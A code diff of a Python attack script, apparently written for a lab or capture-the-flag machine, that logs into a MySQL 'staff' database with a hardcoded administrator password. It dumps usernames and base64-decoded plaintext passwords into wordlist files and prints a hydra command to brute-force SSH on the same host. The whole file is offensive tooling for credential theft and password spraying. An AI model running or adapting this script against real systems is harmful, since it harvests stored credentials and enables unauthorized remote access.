@@ -1,13 +1,38 @@
+from time import sleep
+
 import mysql.connector
 import base64
+import os
+from pathlib import Path
+
+HOST = '192.168.1.179'
+DATABASE = 'staff'
+DBUSER = 'qdpmadmin'
+DBPASS = 'UcVQCMQk2STVeS6J'
+WDIR=str(Path.cwd())
+USER_FILE = WDIR + "/out/user.txt"
+PASS_FILE = WDIR + "/out/pass.txt"
 
 
-def mysql_select():
+
+def create_file(FILE):
+    file = open(FILE, "w")
+    return file
+
+
+def decrypt_base64(base64_pass):
+    uncpass = base64.b64decode(base64_pass)
+    return uncpass
+
+
+def mysql_select(user_file, pass_file):
+
+
     try:
-        connection = mysql.connector.connect(host='192.168.1.179',
-                                            database='staff',
-                                            user='qdpmadmin',
-                                            password='UcVQCMQk2STVeS6J')
+        connection = mysql.connector.connect(host=HOST,
+                                            database=DATABASE,
+                                            user=DBUSER,
+                                            password=DBPASS)
 
 
         sql_select_Query = "select * from user join login on (login.user_id = user.id);"
@@ -18,8 +43,11 @@ def mysql_select():
 
         for row in records:
             uncpass = base64.b64decode(row[6])
-            print(row[2], uncpass)
-            #print(row)
+            #print(row[2], uncpass)
+            user = row[2] + "\n"
+            user_file.write(user.lower())
+            pass_file.write(str(uncpass, 'utf-8') + "\n")
+
 
     except mysql.connector.Error as e:
         print("Error reading data from MySQL table", e)
@@ -31,8 +59,10 @@ def mysql_select():
 
 
 def main():
-    mysql_select()
-
+    user_file = create_file(USER_FILE)
+    pass_file = create_file(PASS_FILE)
+    mysql_select(user_file, pass_file)
+    print('/usr/bin/hydra -L {} -P {} ssh://{}'.format(USER_FILE, PASS_FILE,HOST))
 
 if __name__ == "__main__":
     main()
